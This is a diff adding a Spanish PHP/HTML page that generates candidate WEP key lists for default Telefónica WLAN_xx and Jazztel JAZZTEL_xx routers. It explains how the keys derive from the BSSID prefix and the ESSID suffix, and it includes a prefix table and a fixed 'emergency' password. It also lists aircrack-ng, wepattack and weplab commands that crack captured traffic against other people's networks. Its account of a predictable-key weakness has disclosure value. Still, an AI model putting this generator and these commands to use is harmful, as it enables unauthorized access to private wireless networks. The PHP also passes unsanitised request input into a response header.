@@ -1,0 +1,268 @@
+<?php
+
+  switch($_REQUEST['boton']) {
+
+  	case "Telefonica":
+  	case "Jazztel":
+ 
+      // Proceso los datos ESSID i BSSID del formulario
+      $inicio = strtoupper($_REQUEST['bssid']);
+      $final  = strtoupper($_REQUEST['essid']);
+
+      // enviaremos un fichero de texto, que se va a llamar wlan_??.txt
+      header("Content-type: text/plain");
+      header("Content-Disposition: attachment; filename=WLAN_$final.txt");
+
+      // Si querian la contrase&ntilde;a de emergencia que
+      // utiliza Timofonica cuando ha reseteado el aparato
+      if (isset($_REQUEST['emergencia'])) {
+        print("1234567890123"."\n");
+      }
+
+      // Genero las 16^4 contrase&ntilde;as hexadecimales
+      for ($i = 0; $i < 65536; $i++) {
+        printf("%s%04X%s\n", $inicio, $i, $final);
+      }
+
+      break;
+  }
+
+?>
+
+
+<html xml:lang="es" xmlns="http://www.w3.org/1999/xhtml" lang="es"><head>
+
+
+
+
+
+  
+    <title>Desencriptando WLAN_xx y JAZZTEL_xx</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="description" content="Contrase�as por defecto de Telef�nica, Contrase�as por defecto de Jazztel">
+    <meta name="keywords" content="WLAN_xx, JAZZTEL_xx">
+  </head><body>
+    <h1>Contraseñas por defecto de WLAN_xx de Telefónica y JAZZTEL_xx de Jazztel</h1>
+
+    <h2>Introducción</h2>
+    
+    <p>La contraseña <a href="http://es.wikipedia.org/wiki/WEP">WEP</a> 
+de una red wireless puede ser realmente difícil de encontrar si ésta ha 
+sido bien escogida,ya que existen 2 elevado a 128 posibles contraseñas. 
+Para encontrar la contraseña sin probar todas las posibles, debemos 
+utilizar métodos que exigen capturar unos pocos millones de paquetes de 
+tráfico de red, y en las redes no se genera ese tráfico en un tiempo 
+razonable a menos que realicen muchas descargas de ficheros o que sea 
+una empresa con muchos trabajadores accediendo a internet (o que 
+nosotros utilizemos técnicas especiales en las que les obliguemos a 
+generar el tráfico).</p>
+
+    <p>Sin embargo, la contraseña por defecto que viene con los routers 
+ADSL de las compañías telefónicas es fácilmente predecible. Con tener un
+ poco de información de la red, que es información visible para todos, 
+las contraseñas se reducen a unas pocas miles que podemos guardar en una
+ lista. En un caso así, para hallar la contraseña basta con capturar 
+unos cuatro paquetes de información y probar a descodificarlos con todas
+ las posibles contraseñas de dicha lista. Con las herramientas 
+adecuadas, esto es un segundo.</p>
+
+    <p>En los formularios de esta página, si introduces los datos de la 
+red wireless que has encontrado, genera un fichero con las posibles 
+contraseñas. Una vez con este fichero, utilizad vuestras herramientas 
+para capturar tráfico de red wireless y para intentar descodificarlo 
+probando con un fichero de contraseñas: aircrack-ng, wepattack, weplab, 
+etc.</p>
+
+    <blockquote>
+      <tt>aircrack-ng -a 1 -b BSSID -w fichero_contraseñas fichero_captura</tt><br>
+      <tt>wepattack -f fichero_captura -w fichero_contraseñas</tt><br>
+      <tt>cat fichero_contraseñas | weplab --key 128 -y --bssid BSSID fichero_captura</tt>
+    </blockquote>
+
+    <p>AVISO: esta página está alojada en un servidor web estático que 
+no ejecuta PHP. Para utilizarla guardala en tu ordenador y llévala a un 
+servidor web que sí ejecute PHP.</p>
+
+    <p>Quizás fuera más correcto programar el código en Javascript, para
+ que consumiera tiempo de cálculo del cliente y no del servidor, y 
+además se pudiera ejecutar en cualquier máquina. Pero no encuentro 
+tiempo para cambiarlo. Por ahora, esto es lo que hay  ;-)</p>
+
+    <ul>
+      <li><a href="#TELEFONICA">Redes WLAN_xx de Telefónica</a></li>
+      <li><a href="#JAZZTEL">Redes JAZZTEL_xx de Jazztel</a></li>
+      <li><a href="#ORANGE">Redes ADSLxxxx de Orange   (en breve estará)</a></li>
+      <li><a href="#DLINKWIRELESS">Redes DLINKWIRELESS de ????   (en breve estará)</a></li>
+      <li><a href="#SPEEDTOUCH">Redes SpeedTouch de ????   (en breve estará)</a></li>
+    </ul>
+
+
+
+    <p>&nbsp;</p>
+
+    <hr>
+
+    <p>&nbsp;</p>
+
+
+
+    <h2 id="TELEFONICA">Redes WLAN_xx de Telefónica</h2>
+
+    <h3>Formulario:</h3>
+
+    <form method="post" action="wlan_xx.php">
+      <p>Introduce los datos del punto de acceso que has encontrado:</p>
+      <br>
+      <p><input name="bssid" value="X000138" checked="checked" type="radio">BSSID: 00:01:36:xx:xx:xx</p>
+      <p><input name="bssid" value="X000138" type="radio">BSSID: 00:01:38:xx:xx:xx</p>
+      <p><input name="bssid" value="Z0002CF" type="radio">BSSID: 00:02:CF:xx:xx:xx</p>
+      <p><input name="bssid" value="Z0023F8" type="radio">BSSID: 00:02:CF:xx:xx:xx (alternativo)</p>
+      <p><input name="bssid" value="C0030DA" type="radio">BSSID: 00:03:C9:xx:xx:xx</p>
+      <p><input name="bssid" value="C0030DA" type="radio">BSSID: 00:03:DA:xx:xx:xx</p>
+      <p><input name="bssid" value="Z001349" type="radio">BSSID: 00:13:49:xx:xx:xx</p>
+      <p><input name="bssid" value="Z0002CF" type="radio">BSSID: 00:13:49:xx:xx:xx (alternativo)</p>
+      <p><input name="bssid" value="C0030DA" type="radio">BSSID: 00:16:38:xx:xx:xx</p>
+      <p><input name="bssid" value="C0030DA" type="radio">BSSID: 00:19:15:xx:xx:xx</p>
+      <p><input name="bssid" value="Z0002CF" type="radio">BSSID: 00:19:CB:xx:xx:xx</p>
+      <p><input name="bssid" value="Z0019CB" type="radio">BSSID: 00:19:CB:xx:xx:xx (alternativo)</p>
+      <p><input name="bssid" value="C001D20" type="radio">BSSID: 00:1A:2B:xx:xx:xx</p>
+      <p><input name="bssid" value="C0030DA" type="radio">BSSID: 00:1A:2B:xx:xx:xx (alternativo)</p>
+      <p><input name="bssid" value="C001D20" type="radio">BSSID: 00:1D:20:xx:xx:xx</p>
+      <p><input name="bssid" value="Z0023F8" type="radio">BSSID: 00:23:F8:xx:xx:xx</p>
+      <p><input name="bssid" value="Z001349" type="radio">BSSID: 00:60:B3:xx:xx:xx</p>
+      <p><input name="bssid" value="Z001349" type="radio">BSSID: 00:A0:C5:xx:xx:xx</p>
+      <br>
+      <p>ESSID: WLAN_<input name="essid" value="00" size="2" maxlength="2" type="text"></p>
+      <br>
+      <p><input name="emergencia" value="on" type="checkbox">Tambien la contraseña de emergencia</p>
+      <br>
+      <p><input name="boton" value="Telefonica" type="submit"></p>
+    </form>
+
+    <h3>Explicación:</h3>
+
+    <p>Las contraseñas por defecto que viene con los routers ADSL de Telefónica se reducen a 2<sup>16</sup>, es decir, 65536 posibles contraseñas, que varían para cada router ADSL que encontréis. La explicación es la siguiente:</p>
+
+    <p>(1) Cada tarjeta de red tiene una <a href="http://es.wikipedia.org/wiki/MAC_address"> dirección MAC</a> única, formada por doce cifras <a href="http://es.wikipedia.org/wiki/Hexadecimal">hexadecimales</a>. Por ejemplo: 00:60:B3:D4:97:F9. Las primeras seis cifras (llamadas OUI) <a href="http://standards.ieee.org/regauth/oui/index.shtml">identifican el fabricante de la tarjeta</a>. En el ejemplo anterior, el fabricante es Z-COM, INC.</p>
+
+    <p>(2) Un <a href="http://es.wikipedia.org/wiki/Router">router</a> 
+tiene una tarjeta de red por cada camino por donde puede enviar 
+información. Los router ADSL de Telefónica tienen dos: una en el camino 
+de tu red doméstica y otra en el camino de la red telefónica.</p>
+
+    <p>(3) Las redes wireless domésticas de Telefónica son la que vemos 
+como WLAN_??, donde cada ? es un carácter de entre los 16 posibles 
+caracteres hexadecimales: 0, 1, ..., 9, A, B, ..., F. Por ejemplo: 
+WLAN_5E.</p>
+
+    <p>(4) La contraseña por defecto de la red doméstica de Telefónica 
+es el primer carácter de la marca del router, y los doce caracteres de 
+la MAC de la tarjeta de red que encamina a la red interna de telefónica.
+ En nuestro ejemplo supongamos: Z0013492C4B5E.</p>
+
+    <p>(5) Nosotros no podemos a priori conocer el modelo del router ni 
+la dirección MAC de dicha tarjeta. Sin embargo sí podemos conocer el 
+nombre de la red (ESSID) y la dirección MAC de la tarjeta de red que da a
+ la red doméstica (BSSID). En nuestro ejemplo son WLAN_5E y 
+00:60:B3:D4:97:F9, respectivamente.</p>
+
+    <p>(6) Pero resulta que los dos últimos caracteres del ESSID son los
+ dos últimos caracteres de la contraseña que buscamos. En el ejemplo el 
+nombre de la red es WLAN_5E así que la contraseña acaba en 5E.</p>
+
+    <p>(7) Y además resulta también que, consultando la siguiente tabla,
+ con los seis primeros caracteres del BSSID podemos acertar la marca del
+ router y los seis primeros caracteres de la dirección MAC interna del 
+router, ya que estos seis caracteres identifican al fabricante, y 
+tampoco hay tantos modelos de routers. En nuestro ejemplo el BSSID es 
+00:60:B3:D4:97:F9 así que sus primeras seis cifras indican que los 
+primeros sietes caracteres de la contraseña son Z001349.</p>
+
+    <table align="center" border="1" cellpadding="10">
+      <tbody><tr><th>BSSID</th><th>inicio contraseña</th></tr>
+      <tr><td>00:01:36:xx:xx:xx (Xavvy 7768r)</td><td>X000138</td></tr>
+      <tr><td>00:01:38:xx:xx:xx (Xavvy 7768r)</td><td>X000138</td></tr>
+      <tr><td>00:03:C9:xx:xx:xx (Comtrend 535)</td><td>C0030DA</td></tr>
+      <tr><td>00:16:38:xx:xx:xx (Comtrend 536+)</td><td>C0030DA</td></tr>
+      <tr><td>00:30:DA:xx:xx:xx (Comtrend 536+)</td><td>C0030DA</td></tr>
+      <tr><td>00:19:15:xx:xx:xx (Comtrend 536+)</td><td>C0030DA</td></tr>
+      <tr><td>00:1A:2B:xx:xx:xx (Comtrend 536+)</td><td>C001D20 ó C0030DA</td></tr>
+      <tr><td>00:1D:20:xx:xx:xx (Comtrend 536+)</td><td>C001D20</td></tr>
+      <tr><td>00:60:B3:xx:xx:xx (Zyxel com)</td><td>Z001349</td></tr>
+      <tr><td>00:A0:C5:xx:xx:xx (Zyxel 650HW)</td><td>Z001349</td></tr>
+      <tr><td>00:13:49:xx:xx:xx (Zyxel 660HW)</td><td>Z001349 ó Z0002CF</td></tr>
+      <tr><td>00:02:CF:xx:xx:xx (Zyxel 660HW)</td><td>Z0002CF ó Z0023F8</td></tr>
+      <tr><td>00:19:CB:xx:xx:xx (Zyxel 660HW)</td><td>Z0002CF ó Z0019CB</td></tr>
+      <tr><td>00:23:F8:xx:xx:xx (Zyxel 660HW)</td><td>Z0023F8</td></tr>
+    </tbody></table>
+
+    <p>(8) Si la contraseña tiene trece caracteres, y conocemos los 
+siete primeros y los dos últimos, sólo nos falta adivinar cuatro. Para 
+colmo sabemos que estos cuatro caracteres solo pueden tener dieciséis 
+posibles valores (0, 1, ...,9, A, B, ..., F) ya que forman parte de la 
+dirección MAC de una tajeta de red. Esto da 16<sup>4</sup> = 65536 
+posibles contraseñas para esa red wireless. En el ejemplo: 
+Z001349????5E, donde ???? va desde 0000 hasta FFFF (es decir, las 
+contraseñas Z00134900005E, Z00134900015E, ..., Z001349FFFF5E).</p>
+
+
+
+    <p>&nbsp;</p>
+
+    <hr>
+
+    <p>&nbsp;</p>
+
+
+
+    <h2 id="JAZZTEL">Redes JAZZTEL_xx de Jazztel</h2>
+
+    <h3>Formulario:</h3>
+
+    <form method="post" action="wlan_xx.php">
+      <p>Introduce los datos del punto de acceso que has encontrado:</p>
+      <br>
+      <p><input name="bssid" value="E001D20" checked="checked" type="radio">BSSID: 00:1A:2B:xx:xx:xx (Comtrend 5361)</p>
+      <br>
+      <p>ESSID: JAZZTEL_<input name="essid" value="00" size="2" maxlength="2" type="text"></p>
+      <br>
+      <p><input name="boton" value="Jazztel" type="submit"></p>
+    </form>
+
+    <h3>Explicación:</h3>
+
+    <p>Las contraseñas por defecto que viene con los routers ADSL de 
+Jazztel siguen el mismo patrón que las de Telefónica anteriormente 
+comentadas. Se reducen a 2 elevado a 16, es decir, 65536 posibles 
+contraseñas, que varían para cada router ADSL que encontréis. Con la 
+salvedad de que Jazztel cuenta con un único modelo de router:</p>
+
+    <table align="center" border="1" cellpadding="10">
+      <tbody><tr><th>BSSID</th><th>inicio contraseña</th></tr>
+      <tr><td>00:1A:2B:xx:xx:xx (Comtrend 5361)</td><td>E001D20</td></tr>
+    </tbody></table>
+
+
+
+    <p>&nbsp;</p>
+
+    <hr>
+
+    <p>&nbsp;</p>
+
+
+
+    <p>Copyleft © Alejandro Castán Salinas</p>
+
+    <p>Se otorga el permiso para copiar, distribuir y/o modificar este 
+documento bajo las condiciones de la licencia Creative Commons de 
+Reconocimiento-NoComercial-CompartirIgual, versión 3.0 o cualquier otra 
+versión posterior. Puedes consultar dicha licencia en <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.es">http://creativecommons.org/licenses/by-nc-sa/3.0/deed.es</a>.</p>
+
+    <p>El contenido de este documento puede cambiar debido a 
+ampliaciones y correcciones enviadas por los lectores. Encontrarás 
+siempre la última versión del documento en <a href="http://www.xtec.net/%7Eacastan/textos/">http://www.xtec.net/~acastan/textos/</a>.</p>
+
+    <p>&nbsp;</p>
+
+  </body></html>
